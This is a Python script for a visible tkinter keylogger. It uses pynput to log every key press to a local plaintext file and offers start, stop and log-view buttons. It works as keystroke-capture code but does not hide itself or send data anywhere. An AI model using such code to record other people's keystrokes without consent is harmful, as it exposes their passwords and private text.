import tkinter as tk 
from pynput.keyboard import Listener, Key
import os
import threading

log_file = "keylog.txt"
listener = None
is_listening = False

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f" {key} ")

def on_release(key):
    if key == Key.esc:
        stop_keylogger()

def start_keylogger():
    global listener, is_listening
    if not is_listening:
        is_listening = True
        status_label.config(text="Status: Listening", fg="green")

        def listen():
            global listener 
            listener = Listener(on_press=on_press, on_release=on_release)
            listener.start()
            listener.join()

        threading.Thread(target=listen, daemon=True).start()


def stop_keylogger():
    global listener, is_listening
    if is_listening and listener is not None:
        is_listening = False
        listener.stop()
        status_label.config(text="Status: Stopped", fg="red")

def ensure_log_file():
    if not os.path.exists(log_file):
        open(log_file, 'w').close()


def refresh_log_view():
    try:
        with open(log_file, 'r') as f:
            log_content = f.read()
        log_display.delete("1.0", tk.END)
        log_display.insert(tk.END, log_content)
    except Exception as e:
        log_display.delete("1.0", tk.END)
        log_display.insert(tk.END, f"Error reading log: {e}")


#gui setup

ensure_log_file()
root = tk.Tk()
root.title("Keylogger")
root.geometry("500x400")
root.resizable(False, False)


status_label = tk.Label(root, text="Status: Stopped", fg="red", font=("Arial",12))
status_label.pack(pady=10)

log_display = tk.Text(root, height=10, width=45, wrap="word")
log_display.pack(padx=10, pady=10)

start_btn = tk.Button(root, text = "Start Keylogger", command=start_keylogger,width=20)
start_btn.pack(pady=5)

stop_btn = tk.Button(root, text="Stop Keylogger", command=stop_keylogger, width=20)
stop_btn.pack(pady=5)

refresh_btn = tk.Button(root, text="Refresh Log", command=refresh_log_view, width=20)
refresh_btn.pack(pady=5)


root.mainloop()